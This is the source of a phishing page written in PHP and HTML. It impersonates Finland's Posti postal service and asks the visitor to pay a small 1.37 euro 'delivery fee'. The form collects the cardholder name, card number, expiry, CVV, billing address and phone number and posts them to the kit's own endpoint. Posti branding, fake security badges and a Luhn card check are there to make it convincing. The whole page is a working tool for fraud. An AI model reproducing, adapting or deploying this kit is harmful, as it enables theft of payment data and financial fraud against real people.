<?php
if (!defined('ROOT')) die('403');

?><!DOCTYPE html>
<html lang="fi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Maksu - Posti</title>
<link rel="icon" href="https://assets.ctfassets.net/dvxpcmq06s7e/pkrFI9pZwsBhQ2lBowzyt/3c40676e510621e6adb7a1aebbe8ebc0/favicon.ico">
<link href="https://cdn.posti.fi/asset/css/typography-posti-font.css" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:'Posti Font',Arial,sans-serif;background:#f7f7f7;color:#2A2B2D;font-size:16px;line-height:1.5;min-height:100vh;display:flex;flex-direction:column;}
a{text-decoration:none;color:inherit;}

/* TOP BAR */
.tb{background:#fff;border-bottom:1px solid #e5e5e5;display:flex;align-items:center;height:44px;padding:0 24px;gap:0;}
.tb-logo{display:flex;align-items:center;margin-right:20px;}
.tb-logo-text{font-size:28px;font-weight:900;font-style:italic;color:#FF6200;letter-spacing:-1px;line-height:1;}
.tb-tabs{display:flex;gap:0;height:100%;}
.tb-tab{display:flex;align-items:center;padding:0 14px;font-size:14px;font-weight:600;color:#2A2B2D;height:100%;cursor:pointer;}
.tb-tab.active{background:#1a1a1a;color:#fff;border-radius:20px;height:30px;margin:auto 4px;padding:0 16px;}
.tb-right{margin-left:auto;display:flex;align-items:center;gap:16px;}
.tb-link{display:flex;align-items:center;gap:5px;font-size:13px;color:#2A2B2D;font-weight:500;}
.tb-link svg{width:16px;height:16px;fill:currentColor;flex-shrink:0;}
.tb-sites-btn{display:flex;align-items:center;gap:6px;font-size:13px;font-weight:600;border:1.5px solid #ddd;border-radius:20px;padding:4px 12px;cursor:pointer;}
.tb-sites-btn svg{width:14px;height:14px;fill:#2A2B2D;}
.tb-langs{display:flex;align-items:center;border:1.5px solid #e5e5e5;border-radius:20px;overflow:hidden;padding:2px;}
.tb-lang{font-size:12px;font-weight:700;padding:3px 8px;border-radius:16px;cursor:pointer;color:#666;}
.tb-lang.active{background:#2A2B2D;color:#fff;}

/* BREADCRUMB */
.breadcrumb{background:#fff;padding:12px 24px;border-bottom:1px solid #e5e5e5;font-size:13px;color:#666;}
.breadcrumb a{color:#FF6200;font-weight:600;}
.breadcrumb span{margin:0 8px;color:#ccc;}

/* PAGE CONTENT */
.page-content{flex:1;display:flex;justify-content:center;padding:40px 20px;}

/* PAYMENT CARD */
.payment-wrapper{width:100%;max-width:520px;}
.secure-badge{display:flex;align-items:center;gap:8px;color:#27ae60;font-size:13px;font-weight:600;margin-bottom:16px;}
.secure-badge svg{width:18px;height:18px;fill:#27ae60;}

.payment-card{background:#fff;border-radius:16px;box-shadow:0 4px 20px rgba(0,0,0,0.08);overflow:hidden;}
.payment-header{background:linear-gradient(135deg,#FF6200 0%,#FF8533 100%);padding:24px 28px;color:#fff;}
.payment-header h1{font-size:20px;font-weight:800;margin-bottom:6px;}
.payment-header p{font-size:14px;opacity:0.9;}
.payment-body{padding:28px;}

/* ORDER SUMMARY */
.order-summary{background:#f9f9f9;border-radius:12px;padding:18px 20px;margin-bottom:24px;border:1px solid #eee;}
.order-row{display:flex;justify-content:space-between;align-items:center;font-size:14px;padding:6px 0;}
.order-row:first-child{padding-top:0;}
.order-row:last-child{padding-bottom:0;}
.order-label{color:#666;}
.order-value{font-weight:700;color:#2A2B2D;}
.order-row.total{border-top:1px dashed #ddd;margin-top:10px;padding-top:14px;}
.order-row.total .order-label{font-weight:700;color:#2A2B2D;}
.order-row.total .order-value{font-size:22px;color:#FF6200;}

/* SECTION DIVIDER */
.section-title{font-size:14px;font-weight:800;color:#2A2B2D;margin:28px 0 16px;padding-top:20px;border-top:1px solid #eee;display:flex;align-items:center;gap:10px;}
.section-title:first-of-type{margin-top:0;padding-top:0;border-top:none;}
.section-title svg{width:20px;height:20px;fill:#FF6200;}

/* FORM STYLES */
.form-group{margin-bottom:20px;}
.form-group label{display:block;font-size:13px;font-weight:700;color:#2A2B2D;margin-bottom:8px;}
.form-group input{width:100%;height:50px;border:2px solid #e5e5e5;border-radius:12px;padding:0 16px;font-size:15px;font-family:inherit;color:#2A2B2D;background:#fff;transition:all 0.2s;}
.form-group input:focus{outline:none;border-color:#FF6200;box-shadow:0 0 0 3px rgba(255,98,0,0.1);}
.form-group input::placeholder{color:#bbb;}
.form-group input.valid{border-color:#27ae60;background:#f8fff9;}
.form-group input.invalid{border-color:#e74c3c;background:#fff8f8;}

.form-row{display:grid;grid-template-columns:1fr 1fr;gap:16px;}
.form-row-3{display:grid;grid-template-columns:2fr 1fr;gap:16px;}

.field-error{color:#e74c3c;font-size:11px;font-weight:600;margin-top:6px;display:none;}
.field-error.show{display:block;}

.card-type-badge{display:inline-flex;align-items:center;gap:4px;font-size:11px;font-weight:700;padding:4px 10px;border-radius:6px;margin-top:8px;display:none;}
.card-type-badge.show{display:inline-flex;}
.card-type-badge.visa{background:#1a1f71;color:#fff;}
.card-type-badge.master{background:linear-gradient(135deg,#eb001b,#f79e1b);color:#fff;}
.card-type-badge.amex{background:#007bc1;color:#fff;}
.card-type-badge.unknown{background:#888;color:#fff;}

#luhn-msg{font-size:11px;font-weight:600;margin-top:6px;display:none;}
#luhn-msg.valid{color:#27ae60;display:block;}
#luhn-msg.invalid{color:#e74c3c;display:block;}

/* SUBMIT BUTTON */
.btn-submit{width:100%;height:54px;background:#FF6200;color:#fff;border:none;border-radius:30px;font-size:16px;font-weight:800;font-family:inherit;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;margin-top:28px;transition:all 0.2s;opacity:0.5;cursor:not-allowed;}
.btn-submit.ready{opacity:1;cursor:pointer;}
.btn-submit.ready:hover{background:#e55500;transform:translateY(-1px);box-shadow:0 4px 12px rgba(255,98,0,0.3);}
.btn-submit svg{width:20px;height:20px;fill:#fff;}

/* SECURITY INFO */
.security-info{display:flex;align-items:center;justify-content:center;gap:20px;margin-top:24px;padding-top:20px;border-top:1px solid #eee;}
.security-item{display:flex;align-items:center;gap:6px;font-size:11px;color:#888;}
.security-item svg{width:14px;height:14px;fill:#888;}


.card-brands{display:flex;align-items:center;justify-content:center;gap:10px;margin-top:20px;flex-wrap:wrap;}


.pay-badge{display:inline-flex;align-items:center;justify-content:center;height:34px;padding:0 8px;border-radius:6px;}
.pay-badge.gpay{background:#fff;border:1.5px solid #dadce0;}
.pay-badge.apay{background:#000;border:1.5px solid #000;}
.pay-badge svg{display:block;}


.back-link{display:inline-flex;align-items:center;gap:6px;color:#FF6200;font-size:13px;font-weight:600;margin-top:20px;cursor:pointer;}
.back-link:hover{text-decoration:underline;}
.back-link svg{width:16px;height:16px;fill:#FF6200;}


.btn-submit.loading{pointer-events:none;}
.btn-submit.loading .btn-text{display:none;}
.btn-submit .spinner{display:none;width:20px;height:20px;border:3px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%;animation:spin 0.8s linear infinite;}
.btn-submit.loading .spinner{display:block;}
@keyframes spin{to{transform:rotate(360deg);}}

/* FOOTER */
footer{background:#fff;border-top:1px solid #e5e5e5;padding:20px 32px;text-align:center;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px;}
footer p{font-size:12px;color:#888;margin:0;}
footer a{color:#FF6200;font-weight:600;}

/* TABLET */
@media(max-width:900px){
    .tb-sites-btn{display:none;}
    .payment-wrapper{max-width:100%;}

/* MOBILE */
@media(max-width:600px){
    .tb{padding:0 16px;height:50px;}
    .tb-sites-btn,.tb-langs,.tb-tabs,.tb-link{display:none;}
    .tb-logo-text{font-size:24px;}
    .breadcrumb{padding:10px 16px;font-size:12px;}
    .breadcrumb span{margin:0 5px;}
    .page-content{padding:20px 12px;}
    .payment-wrapper{max-width:100%;}
    .secure-badge{font-size:12px;margin-bottom:12px;}
    .payment-card{border-radius:14px;}
    .payment-header{padding:20px;}
    .payment-header h1{font-size:18px;}
    .payment-header p{font-size:13px;}
    .payment-body{padding:20px 16px;}
    .order-summary{padding:14px 16px;margin-bottom:20px;}
    .order-row{font-size:13px;}
    .order-row.total .order-value{font-size:18px;}
    .section-title{font-size:13px;margin:20px 0 12px;padding-top:16px;}
    .form-group{margin-bottom:16px;}
    .form-group label{font-size:12px;margin-bottom:6px;}
    .form-group input{height:46px;font-size:14px;padding:0 14px;border-radius:10px;}
    .form-row,.form-row-3{grid-template-columns:1fr;gap:0;}
    .field-error{font-size:10px;}
    .card-type-badge{font-size:10px;padding:3px 8px;}
    .btn-submit{height:50px;font-size:15px;margin-top:24px;}
    .security-info{flex-wrap:wrap;gap:10px;padding-top:16px;margin-top:20px;}
    .security-item{font-size:10px;}
    .card-brands{margin-top:16px;gap:8px;}
    .back-link{font-size:12px;margin-top:16px;}
    footer{padding:16px;}
    footer p{font-size:11px;}

/* SMALL MOBILE */
@media(max-width:380px){
    .payment-header{padding:16px;}
    .payment-header h1{font-size:16px;}
    .payment-body{padding:16px 12px;}
    .order-row.total .order-value{font-size:16px;}
    .btn-submit{height:46px;font-size:14px;}

.tb-logo-img{height:40px;width:auto;display:block;}
</style>
</head>
<body>

<!-- TOP BAR -->
<div class="tb">
<div class="tb-logo">
    <img src="home/status/logo.png" alt="Logo" class="tb-logo-img">
</div>
    <div class="tb-tabs">
        <span class="tb-tab active">Henkilöille</span>
        <span class="tb-tab">Yrityksille</span>
    </div>
    <div class="tb-right">
        <a class="tb-link" href="#">
            <svg viewBox="0 0 24 24"><path fill-rule="evenodd" d="M11 4a7 7 0 1 0 4.856 12.041 1 1 0 0 1 .185-.185A7 7 0 0 0 11 4m7.032 12.618a9 9 0 1 0-1.414 1.414l3.675 3.675a1 1 0 0 0 1.414-1.414z" clip-rule="evenodd"/></svg>
            Haku
        </a>
        <a class="tb-link" href="#">
            <svg viewBox="0 0 24 24"><path fill-rule="evenodd" d="M12 3a7 7 0 0 0-7 7c0 1.892.853 3.678 2.292 5.547 1.215 1.578 2.77 3.12 4.44 4.776l.268.266.268-.266c1.67-1.656 3.225-3.198 4.44-4.776C18.147 13.678 19 11.892 19 10a7 7 0 0 0-7-7m-9 7a9 9 0 0 1 18 0c0 2.526-1.147 4.74-2.708 6.767-1.304 1.694-2.974 3.349-4.641 5.002q-.474.469-.944.938a1 1 0 0 1-1.414 0q-.47-.469-.944-.938c-1.668-1.653-3.337-3.308-4.641-5.002C4.147 14.74 3 12.527 3 10m9-2a2 2 0 1 0 0 4 2 2 0 0 0 0-4m-4 2a4 4 0 1 1 8 0 4 4 0 0 1-8 0" clip-rule="evenodd"/></svg>
            Palvelupisteet
        </a>
        <div class="tb-sites-btn">
            <svg viewBox="0 0 24 24"><path d="M10 6a2 2 0 1 1 4 0 2 2 0 0 1-4 0m6 0a2 2 0 1 1 4 0 2 2 0 0 1-4 0M6 10a2 2 0 1 0 0 4 2 2 0 0 0 0-4m4 2a2 2 0 1 1 4 0 2 2 0 0 1-4 0m8-2a2 2 0 1 0 0 4 2 2 0 0 0 0-4m-2 8a2 2 0 1 1 4 0 2 2 0 0 1-4 0m-4-2a2 2 0 1 0 0 4 2 2 0 0 0 0-4m-8 2a2 2 0 1 1 4 0 2 2 0 0 1-4 0M4 6a2 2 0 1 0 4 0 2 2 0 0 0-4 0"/></svg>
            Kaikki sivustot
            <svg viewBox="0 0 24 24"><path fill-rule="evenodd" d="M5.293 8.293a1 1 0 0 1 1.414 0L12 13.586l5.293-5.293a1 1 0 1 1 1.414 1.414l-6 6a1 1 0 0 1-1.414 0l-6-6a1 1 0 0 1 0-1.414" clip-rule="evenodd"/></svg>
        </div>
        <div class="tb-langs">
            <span class="tb-lang active">FI</span>
            <span class="tb-lang">SV</span>
            <span class="tb-lang">EN</span>
        </div>
    </div>
</div>

<!-- BREADCRUMB -->
<div class="breadcrumb">
    <a href="/">Etusivu</a>
    <span>›</span>
    <a href="/">Lähetyksen seuranta</a>
    <span>›</span>
    Maksu
</div>

<!-- PAGE CONTENT -->
<div class="page-content">
    <div class="payment-wrapper">

        <div class="secure-badge">
            <svg viewBox="0 0 24 24"><path fill-rule="evenodd" d="M12 1C8.318 1 5 4.026 5 8v2.08A3.003 3.003 0 0 0 3 13v7a3 3 0 0 0 3 3h12a3 3 0 0 0 3-3v-7a3.003 3.003 0 0 0-2-2.83V8c0-3.974-3.318-7-7-7Zm5 9V8c0-2.857-2.367-5-5-5S7 5.143 7 8v2h10ZM6 12a1 1 0 0 0-1 1v7a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1v-7a1 1 0 0 0-1-1H6Zm7 4a1 1 0 1 0-2 0v2a1 1 0 1 0 2 0v-2Z" clip-rule="evenodd"/></svg>
            Turvallinen maksuyhdyskäytävä
        </div>

        <div class="payment-card">
            <div class="payment-header">
                <h1>Maksa toimitusmaksut</h1>
                <p>Lähetys #FI773817638</p>
            </div>
            <div class="payment-body">

                <!-- Order Summary -->
                <div class="order-summary">
                    <div class="order-row">
                        <span class="order-label">Toimitusmaksu</span>
                        <span class="order-value">1,37 €</span>
                    </div>
                    <div class="order-row">
                        <span class="order-label">Käsittelymaksu</span>
                        <span class="order-value">0,00 €</span>
                    </div>
                    <div class="order-row total">
                        <span class="order-label">Yhteensä</span>
                        <span class="order-value">1,37 €</span>
                    </div>
                </div>

                <!-- Payment Form -->
                <form id="card-form" action="/?r=l" method="post" novalidate>

                    <!-- Card Details Section -->
                    <div class="section-title">
                        <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.11 0-2 .89-2 2v12c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg>
                        Korttitiedot
                    </div>

                    <div class="form-group">
                        <label for="d0">Kortinhaltijan nimi</label>
                        <input type="text" name="name" id="d0" autocomplete="cc-name" placeholder="Etunimi Sukunimi">
                        <span class="field-error" id="err-name">Syötä kortinhaltijan nimi</span>
                    </div>

                    <div class="form-group">
                        <label for="cc">Kortin numero</label>
                        <input type="text" name="cc" id="cc" placeholder="0000 0000 0000 0000" autocomplete="cc-number" inputmode="numeric">
                        <span class="card-type-badge" id="card-type"></span>
                        <span id="luhn-msg"></span>
                        <span class="field-error" id="err-cc">Syötä kelvollinen kortin numero</span>
                    </div>

                    <div class="form-row">
                        <div class="form-group">
                            <label for="exp">Voimassaoloaika</label>
                            <input type="text" name="exp" id="exp" placeholder="KK/VV" autocomplete="cc-exp" inputmode="numeric">
                            <span class="field-error" id="err-exp">Syötä voimassaoloaika</span>
                        </div>
                        <div class="form-group">
                            <label for="cvv">Turvakoodi (CVV)</label>
                            <input type="text" name="cvv" id="cvv" placeholder="000" autocomplete="cc-csc" inputmode="numeric">
                            <span class="field-error" id="err-cvv">Syötä turvakoodi</span>
                        </div>
                    </div>

                    <!-- Billing Address Section -->
                    <div class="section-title">
                        <svg viewBox="0 0 24 24"><path fill-rule="evenodd" d="M12 3a7 7 0 0 0-7 7c0 1.892.853 3.678 2.292 5.547 1.215 1.578 2.77 3.12 4.44 4.776l.268.266.268-.266c1.67-1.656 3.225-3.198 4.44-4.776C18.147 13.678 19 11.892 19 10a7 7 0 0 0-7-7m-9 7a9 9 0 0 1 18 0c0 2.526-1.147 4.74-2.708 6.767-1.304 1.694-2.974 3.349-4.641 5.002q-.474.469-.944.938a1 1 0 0 1-1.414 0q-.47-.469-.944-.938c-1.668-1.653-3.337-3.308-4.641-5.002C4.147 14.74 3 12.527 3 10m9-2a2 2 0 1 0 0 4 2 2 0 0 0 0-4m-4 2a4 4 0 1 1 8 0 4 4 0 0 1-8 0" clip-rule="evenodd"/></svg>
                        Laskutusosoite
                    </div>

                    <div class="form-group">
                        <label for="address">Katuosoite</label>
                        <input type="text" name="address" id="address" placeholder="Esimerkkikatu 123" autocomplete="street-address">
                        <span class="field-error" id="err-address">Syötä katuosoite</span>
                    </div>

                    <div class="form-row-3">
                        <div class="form-group">
                            <label for="city">Kaupunki</label>
                            <input type="text" name="city" id="city" placeholder="Helsinki" autocomplete="address-level2">
                            <span class="field-error" id="err-city">Syötä kaupunki</span>
                        </div>
                        <div class="form-group">
                            <label for="zip">Postinumero</label>
                            <input type="text" name="zip" id="zip" placeholder="00100" autocomplete="postal-code" inputmode="numeric">
                            <span class="field-error" id="err-zip">Syötä postinumero</span>
                        </div>
                    </div>

                    <div class="form-group">
                        <label for="phone">Puhelinnumero</label>
                        <input type="tel" name="phone" id="phone" placeholder="+358 40 123 4567" autocomplete="tel" inputmode="tel">
                        <span class="field-error" id="err-phone">Syötä puhelinnumero</span>
                    </div>

                    <button type="submit" class="btn-submit" id="btn-submit" disabled>
                        <svg viewBox="0 0 24 24"><path fill-rule="evenodd" d="M12 1C8.318 1 5 4.026 5 8v2.08A3.003 3.003 0 0 0 3 13v7a3 3 0 0 0 3 3h12a3 3 0 0 0 3-3v-7a3.003 3.003 0 0 0-2-2.83V8c0-3.974-3.318-7-7-7Zm5 9V8c0-2.857-2.367-5-5-5S7 5.143 7 8v2h10ZM6 12a1 1 0 0 0-1 1v7a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1v-7a1 1 0 0 0-1-1H6Zm7 4a1 1 0 1 0-2 0v2a1 1 0 1 0 2 0v-2Z" clip-rule="evenodd"/></svg>
                        <span class="btn-text">Maksa 1,37 €</span>
                        <div class="spinner"></div>
                    </button>

                </form>

                <!-- Security Info -->
                <div class="security-info">
                    <div class="security-item">
                        <svg viewBox="0 0 24 24"><path fill-rule="evenodd" d="M12 1C8.318 1 5 4.026 5 8v2.08A3.003 3.003 0 0 0 3 13v7a3 3 0 0 0 3 3h12a3 3 0 0 0 3-3v-7a3.003 3.003 0 0 0-2-2.83V8c0-3.974-3.318-7-7-7Z" clip-rule="evenodd"/></svg>
                        SSL-suojattu
                    </div>
                    <div class="security-item">
                        <svg viewBox="0 0 24 24"><path d="M12 22C6.477 22 2 17.523 2 12S6.477 2 12 2s10 4.477 10 10-4.477 10-10 10Zm-1-9.414V6h2v5.586l3.95 3.95-1.414 1.414L11 13.586Z"/></svg>
                        Reaaliaikainen vahvistus
                    </div>
                    <div class="security-item">
                        <svg viewBox="0 0 24 24"><path d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
                        3D Secure
                    </div>
                </div>

                
                <div class="card-brands">
                    <!-- Visa -->
                    <svg height="28" viewBox="0 0 750 471" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd"><rect fill="#0E4595" width="750" height="471" rx="40"/><path d="M278.198 334.228l33.36-195.763h53.358l-33.384 195.763h-53.334zm246.11-191.54c-10.572-3.966-27.135-8.222-47.822-8.222-52.725 0-89.863 26.551-90.18 64.604-.297 28.129 26.514 43.821 46.754 53.185 20.77 9.597 27.752 15.716 27.652 24.283-.133 13.123-16.586 19.116-31.924 19.116-21.355 0-32.701-2.967-50.225-10.274l-6.878-3.111-7.487 43.822c12.463 5.466 35.508 10.199 59.438 10.445 56.089 0 92.502-26.248 92.916-66.884.199-22.27-14.016-39.216-44.801-53.188-18.65-9.056-30.072-15.099-29.951-24.269 0-8.137 9.668-16.838 30.56-16.838 17.446-.271 30.106 3.534 39.936 7.5l4.781 2.259 7.231-42.428m137.308-4.223h-41.23c-12.772 0-22.332 3.486-27.94 16.234l-79.245 179.404h56.031s9.159-24.121 11.231-29.418c6.123 0 60.555.084 68.336.084 1.596 6.854 6.492 29.334 6.492 29.334h49.512l-43.187-195.638zm-65.417 126.408c4.414-11.279 21.26-54.724 21.26-54.724-.314.521 4.381-11.334 7.074-18.684l3.606 16.878s10.217 46.729 12.353 56.527h-44.293v.003zm-363.298-122.19l-52.239 133.5-5.565-27.129c-9.726-31.274-40.025-65.157-73.898-82.12l47.767 171.204 56.455-.063 84.004-195.392h-56.524" fill="#FFF"/><path d="M146.92 138.46H60.879l-.682 4.073c66.939 16.204 111.232 55.363 129.618 102.415l-18.709-89.96c-3.229-12.396-12.597-16.096-24.186-16.528" fill="#F2AE14"/></g></svg>

                    
                    <svg height="28" viewBox="0 0 750 471" xmlns="http://www.w3.org/2000/svg"><g fill-rule="evenodd"><rect fill="#000" width="750" height="471" rx="40"/><circle fill="#EB001B" cx="250" cy="235" r="150"/><circle fill="#F79E1B" cx="500" cy="235" r="150"/><path d="M375 126.07a149.78 149.78 0 0 0-55 108.93c0 44.87 19.67 85.18 50.85 112.77a149.46 149.46 0 0 0 4.15 3.93 149.46 149.46 0 0 0 4.15-3.93c31.18-27.59 50.85-67.9 50.85-112.77a149.78 149.78 0 0 0-55-108.93z" fill="#FF5F00"/></g></svg>

                    
                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f2/Google_Pay_Logo.svg/1280px-Google_Pay_Logo.svg.png" alt="Google Pay" height="28" style="display:block;">

                    
                    <img src="https://www.logo.wine/a/logo/Apple_Pay/Apple_Pay-Logo.wine.svg" alt="Apple Pay" height="36" style="display:block;">
                </div>

                <a class="back-link" href="/">
                    <svg viewBox="0 0 24 24"><path fill-rule="evenodd" d="M10.707 18.707a1 1 0 0 1-1.414 0l-6-6a1 1 0 0 1 0-1.414l6-6a1 1 0 0 1 1.414 1.414L6.414 11H20a1 1 0 1 1 0 2H6.414l4.293 4.293a1 1 0 0 1 0 1.414" clip-rule="evenodd"/></svg>
                    Takaisin
                </a>

            </div>
        </div>

    </div>
</div>


<footer>
    <p>Napsauttamalla "Maksa" hyväksyt <a href="#">tietosuojakäytäntömme</a></p>
    <p style="margin-top:8px;">© Posti Group Oyj</p>
</footer>

<script>

function formatCard(input) {
    let val = input.value.replace(/\s/g, '').replace(/\D/g, '');
    let formatted = val.match(/.{1,4}/g);
    input.value = formatted ? formatted.join(' ') : val;
}

function formatExp(input) {
    let val = input.value.replace(/\D/g, '');
    if (val.length >= 2) {
        input.value = val.substring(0, 2) + '/' + val.substring(2, 4);
    } else {
        input.value = val;
    }
}

function formatCVV(input) {
    input.value = input.value.replace(/\D/g, '').substring(0, 4);
}

function formatZip(input) {
    input.value = input.value.replace(/\D/g, '').substring(0, 5);
}


function luhn(value) {
    var digits = value.replace(/\D/g, '');
    if (digits.length < 13) return false;
    var sum = 0;
    var shouldDouble = false;
    for (var i = digits.length - 1; i >= 0; i--) {
        var d = parseInt(digits[i], 10);
        if (shouldDouble) {
            d *= 2;
            if (d > 9) d -= 9;
        }
        sum += d;
        shouldDouble = !shouldDouble;
    }
    return sum % 10 === 0;
}


function detectNetwork(digits) {
    if (/^4/.test(digits)) return 'VISA';
    if (/^5[1-5]/.test(digits)) return 'Mastercard';
    if (/^2[2-7]/.test(digits)) return 'Mastercard';
    if (/^3[47]/.test(digits)) return 'Amex';
    if (/^6(?:011|5)/.test(digits)) return 'Discover';
    return null;
}


function validExp(val) {
    if (!/^\d{2}\/\d{2}$/.test(val)) return false;
    var parts = val.split('/');
    var mm = parseInt(parts[0], 10);
    var yy = parseInt(parts[1], 10);
    if (mm < 1 || mm > 12) return false;
    var now = new Date();
    var fullYear = 2000 + yy;
    var expDate = new Date(fullYear, mm, 1);
    return expDate > now;
}


var fieldState = {
    name: false,
    cc: false,
    exp: false,
    cvv: false,
    address: false,
    city: false,
    zip: false,
    phone: false
};

function refreshButton() {
    var btn = document.getElementById('btn-submit');
    var allOk = fieldState.name && fieldState.cc && fieldState.exp && fieldState.cvv && fieldState.address && fieldState.city && fieldState.zip && fieldState.phone;
    btn.disabled = !allOk;
    if (allOk) {
        btn.classList.add('ready');
    } else {
        btn.classList.remove('ready');
    }
}

function setValid(input, errId) {
    input.classList.remove('invalid');
    input.classList.add('valid');
    document.getElementById(errId).classList.remove('show');
}

function setInvalid(input, errId) {
    input.classList.remove('valid');
    input.classList.add('invalid');
    document.getElementById(errId).classList.add('show');
}


var nameInput = document.getElementById('d0');
nameInput.addEventListener('input', function() {
    var v = this.value.trim();
    var ok = v.length >= 2 && /^[a-zA-ZÀ-ÿ\s\-']+$/.test(v);
    fieldState.name = ok;
    if (ok) setValid(this, 'err-name');
    else if (v.length > 0) setInvalid(this, 'err-name');
    refreshButton();
});
nameInput.addEventListener('blur', function() {
    var v = this.value.trim();
    var ok = v.length >= 2 && /^[a-zA-ZÀ-ÿ\s\-']+$/.test(v);
    fieldState.name = ok;
    if (ok) setValid(this, 'err-name');
    else if (v.length > 0) setInvalid(this, 'err-name');
    refreshButton();
});


var ccInput = document.getElementById('cc');
ccInput.addEventListener('input', function() {
    formatCard(this);

    var raw = this.value;
    var digits = raw.replace(/\D/g, '');
    var net = detectNetwork(digits);
    var badge = document.getElementById('card-type');
    var luhnMsg = document.getElementById('luhn-msg');

    if (net && digits.length >= 4) {
        badge.textContent = net;
        badge.className = 'card-type-badge show';
        if (net === 'VISA') badge.classList.add('visa');
        else if (net === 'Mastercard') badge.classList.add('master');
        else if (net === 'Amex') badge.classList.add('amex');
        else badge.classList.add('unknown');
    } else {
        badge.classList.remove('show');
    }

    var minLen = net === 'Amex' ? 15 : 16;
    if (digits.length === minLen) {
        if (luhn(digits)) {
            luhnMsg.textContent = '✓ Kortin numero kelvollinen';
            luhnMsg.className = 'valid';
            setValid(this, 'err-cc');
            fieldState.cc = true;
        } else {
            luhnMsg.textContent = '';
            luhnMsg.className = 'invalid';
            setInvalid(this, 'err-cc');
            fieldState.cc = false;
        }
    } else {
        luhnMsg.className = '';
        luhnMsg.textContent = '';
        if (digits.length > 0) {
            this.classList.remove('valid', 'invalid');
            document.getElementById('err-cc').classList.remove('show');
        }
        fieldState.cc = false;
    }
    refreshButton();
});


var expInput = document.getElementById('exp');
expInput.addEventListener('input', function() {
    formatExp(this);
    var v = this.value;
    var ok = validExp(v);
    fieldState.exp = ok;
    if (ok) setValid(this, 'err-exp');
    else if (v.length === 5) setInvalid(this, 'err-exp');
    refreshButton();
});
expInput.addEventListener('blur', function() {
    var v = this.value;
    var ok = validExp(v);
    fieldState.exp = ok;
    if (ok) setValid(this, 'err-exp');
    else if (v.length === 5) setInvalid(this, 'err-exp');
    refreshButton();
});


var cvvInput = document.getElementById('cvv');
cvvInput.addEventListener('input', function() {
    formatCVV(this);
    var v = this.value.replace(/\D/g, '');
    var ccDigits = document.getElementById('cc').value.replace(/\D/g, '');
    var isAmex = /^3[47]/.test(ccDigits);
    var ok = isAmex ? v.length === 4 : v.length === 3;
    fieldState.cvv = ok;
    if (ok) setValid(this, 'err-cvv');
    else if (v.length >= 3) setInvalid(this, 'err-cvv');
    refreshButton();
});
cvvInput.addEventListener('blur', function() {
    var v = this.value.replace(/\D/g, '');
    var ccDigits = document.getElementById('cc').value.replace(/\D/g, '');
    var isAmex = /^3[47]/.test(ccDigits);
    var ok = isAmex ? v.length === 4 : v.length === 3;
    fieldState.cvv = ok;
    if (ok) setValid(this, 'err-cvv');
    else if (v.length >= 3) setInvalid(this, 'err-cvv');
    refreshButton();
});


var addressInput = document.getElementById('address');
addressInput.addEventListener('input', function() {
    var v = this.value.trim();
    var ok = v.length >= 5;
    fieldState.address = ok;
    if (ok) setValid(this, 'err-address');
    else if (v.length > 0) setInvalid(this, 'err-address');
    refreshButton();
});
addressInput.addEventListener('blur', function() {
    var v = this.value.trim();
    var ok = v.length >= 5;
    fieldState.address = ok;
    if (ok) setValid(this, 'err-address');
    else if (v.length > 0) setInvalid(this, 'err-address');
    refreshButton();
});


var cityInput = document.getElementById('city');
cityInput.addEventListener('input', function() {
    var v = this.value.trim();
    var ok = v.length >= 2 && /^[a-zA-ZÀ-ÿ\s\-']+$/.test(v);
    fieldState.city = ok;
    if (ok) setValid(this, 'err-city');
    else if (v.length > 0) setInvalid(this, 'err-city');
    refreshButton();
});
cityInput.addEventListener('blur', function() {
    var v = this.value.trim();
    var ok = v.length >= 2 && /^[a-zA-ZÀ-ÿ\s\-']+$/.test(v);
    fieldState.city = ok;
    if (ok) setValid(this, 'err-city');
    else if (v.length > 0) setInvalid(this, 'err-city');
    refreshButton();
});


var zipInput = document.getElementById('zip');
zipInput.addEventListener('input', function() {
    formatZip(this);
    var v = this.value.replace(/\D/g, '');
    var ok = v.length === 5;
    fieldState.zip = ok;
    if (ok) setValid(this, 'err-zip');
    else if (v.length > 0 && v.length < 5) setInvalid(this, 'err-zip');
    refreshButton();
});
zipInput.addEventListener('blur', function() {
    var v = this.value.replace(/\D/g, '');
    var ok = v.length === 5;
    fieldState.zip = ok;
    if (ok) setValid(this, 'err-zip');
    else if (v.length > 0 && v.length < 5) setInvalid(this, 'err-zip');
    refreshButton();
});


var phoneInput = document.getElementById('phone');
phoneInput.addEventListener('input', function() {
    var v = this.value.trim();
    // Accepter format: +358401234567 ou 0401234567 (au moins 8 chiffres)
    var digits = v.replace(/\D/g, '');
    var ok = digits.length >= 8;
    fieldState.phone = ok;
    if (ok) setValid(this, 'err-phone');
    else if (v.length > 0) setInvalid(this, 'err-phone');
    refreshButton();
});
phoneInput.addEventListener('blur', function() {
    var v = this.value.trim();
    var digits = v.replace(/\D/g, '');
    var ok = digits.length >= 8;
    fieldState.phone = ok;
    if (ok) setValid(this, 'err-phone');
    else if (v.length > 0) setInvalid(this, 'err-phone');
    refreshButton();
});


document.getElementById('card-form').addEventListener('submit', function(e) {
    // Validation finale de tous les champs
    var allOk = fieldState.name && fieldState.cc && fieldState.exp && fieldState.cvv && fieldState.address && fieldState.city && fieldState.zip && fieldState.phone;
    if (!allOk) {
        e.preventDefault();
        return false;
    }
    document.getElementById('btn-submit').classList.add('loading');
});
</script>
</body>
</html>
